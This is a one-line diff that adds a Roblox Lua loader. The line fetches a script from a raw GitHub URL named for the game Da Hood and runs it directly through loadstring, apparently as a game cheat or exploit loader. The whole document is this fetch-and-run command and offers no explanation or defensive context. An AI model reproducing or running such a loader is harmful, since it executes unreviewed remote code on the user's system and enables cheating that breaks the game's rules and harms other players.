@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Raijin333/dahood/main/dahoodraijin"))()
